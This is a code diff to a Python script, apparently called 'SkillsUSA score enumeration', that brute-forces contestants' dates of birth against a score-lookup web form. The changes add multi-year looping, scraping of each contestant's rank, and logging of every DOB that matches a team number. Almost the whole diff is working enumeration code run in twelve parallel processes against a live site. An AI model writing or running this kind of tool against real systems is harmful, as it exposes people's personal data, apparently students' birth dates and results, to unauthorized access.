@@ -28,23 +28,11 @@ filter = ""
 
 def main():
     global EID,CID,TEAM,YEAR,PROC,OUT
-    cliargs()
-    if EID != None and CID != None and TEAM != None and YEAR != None and PROC != None and OUT != None:
-        print("starting using cli values")
+    flag = cliargs()
+    if flag:
+        pass
     else:
         mainMenu()
-    if len(TEAM) == 4:
-        try:
-            TEAM = int(TEAM)
-        except:
-            exit
-    elif len(TEAM) == 9:
-        try:
-            TEAM = TEAM.split("-")
-        except:
-            exit
-    else:
-        print("incorret length")
     open(OUT, 'w').write("\x00")
     setup()
 
@@ -59,6 +47,23 @@ def cliargs():
     args = parser.parse_args()
     global EID,CID,TEAM,YEAR,PROC,OUT
     EID,CID,TEAM,YEAR,PROC,OUT = args.E,args.C,args.T,args.D,args.P,args.O
+
+    if EID != None and CID != None and TEAM != None and YEAR != None and PROC != None and OUT != None:
+        print("starting using cli values")
+        flag = True
+    if len(TEAM) == 4:
+        try:
+            TEAM = int(TEAM)
+        except:
+            exit
+    elif len(TEAM) == 9:
+        try:
+            TEAM = TEAM.split("-")
+        except:
+            exit
+    if YEAR != None:
+        YEAR = YEAR.split(',')
+    return flag
 
 def mainMenu():
     menu = ConsoleMenu("SkillsUSA score enumeration", "Skill issue", exit_option_text="Continue", exit_menu_char="C")
@@ -136,7 +141,7 @@ def menuFunctions(condition):
 
 
 
-def parse(html, id, filter):
+def menuParse(html, id, filter):
     soup = BeautifulSoup(html, "html.parser").find("select", id=id).contents
     for i in soup:
         if type(i) == bs4.NavigableString:
@@ -155,6 +160,10 @@ def parse(html, id, filter):
     index = menu(console_menu, id)
     ID = bs_menu[index]["value"]
     return ID
+
+def rankParse(html):
+    soup = BeautifulSoup(html, "html.parser").find("span", id="lblRankPosition").text[:-8:]
+    return soup
 
 def setup():
     global EID,CID,TEAM,YEAR,PROC
@@ -183,7 +192,6 @@ def setup():
         print(type(TEAM))
 
 def teamMap(team, year):
-    print(f"Trying Team {team}")
     array = [[1,31],[2,29],[3,31],[4,30],[5,31],[6,30],[7,31],[8,31],[9,30],[10,31],[11,30],[12,31]]
     with Pool(12) as p:
         for iter in array:
@@ -191,15 +199,17 @@ def teamMap(team, year):
             iter.append(team)
         p.starmap(bruteForce, array)
 
-def bruteForce(month, days, year, team):
+def bruteForce(month, days, years, team):
     data = payload
     data["txtConSeq"] = team
-    for day in range(1, days + 1):
-        dob = f"{month}/{day}/{year}"
-        data["txtDOB"] = dob
-        C = requests.post(url, data=data).text
-        if (check(C)):
-            valid(team, dob)
+    for year in years:
+        for day in range(1, days + 1):
+            dob = f"{month}/{day}/{year}"
+            data["txtDOB"] = dob
+            html_req = requests.post(url, data=data).text
+            if (check(html_req)):
+                rank = rankParse(html_req)
+                valid(team, dob, rank)
 
 def check(html):
     if noMatch in html:
@@ -209,9 +219,11 @@ def check(html):
     else:
         return True
 
-def valid(team, dob):
+def valid(team, dob, rank):
+    if rank == '':
+        return
     global OUT
-    text = f'[*] Team {team} : DOB {dob}\n'
+    text = f'[*] Team {team} : DOB {dob} : Rank {rank}\n'
     print(text)
     if text not in open(OUT, 'r').read():
         open(OUT, 'a').write(text)
